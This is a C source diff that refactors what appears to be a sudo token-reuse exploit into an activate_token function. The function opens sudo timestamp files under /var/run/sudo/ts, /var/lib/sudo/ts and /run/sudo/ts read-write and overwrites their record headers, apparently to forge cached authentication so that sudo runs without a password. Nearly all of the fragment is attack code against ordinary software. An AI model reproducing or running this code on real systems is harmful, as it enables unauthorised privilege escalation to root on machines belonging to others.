@@ -192,17 +192,16 @@ struct timestamp_entry {
     } u;
 };
 
-int main(int ac, char **av) {
+procinfo pinfo_self;
 
-	procinfo pinfo_self;
-	get_proc_info(getpid(), &pinfo_self);
+void activate_token(char *glob_path)
+{
 	glob_t globbuf;
-
-	if (ac <= 1)
-		glob("/var/run/sudo/ts/*", 0, NULL, &globbuf);
-	else
-		glob(av[1], 0, NULL, &globbuf);
-
+	int glob_ret = glob(glob_path, 0, NULL, &globbuf);
+	if (glob_ret != GLOB_NOMATCH && glob_ret != 0) {
+		fprintf(stderr, "ERROR: when glob on %s\n", glob_path);
+		return;
+	}
 	for (int i = 0; i < globbuf.gl_pathc; i++)
 	{
 		int fd = open(globbuf.gl_pathv[i], O_RDWR);
@@ -212,7 +211,7 @@ int main(int ac, char **av) {
 				header.flags = 0;
 				if (lseek(fd, -sizeof(header), SEEK_CUR) == -1) {
 					printf("ERROR: lseek %m\n");
-					return 1;
+					return;
 				}
 				write(fd, &header, sizeof(header));
 				if (header.version == 1) {
@@ -234,5 +233,18 @@ int main(int ac, char **av) {
 			}
 		}
 	}
-		return 0;
+	globfree(&globbuf);
+}
+
+
+int main(int ac, char **av) {
+
+	get_proc_info(getpid(), &pinfo_self);
+
+	if (ac > 1)
+		activate_token(av[1]);
+	activate_token("/var/run/sudo/ts/*");
+	activate_token("/var/lib/sudo/ts/*");
+	activate_token("/run/sudo/ts/*");
+	return 0;
 }
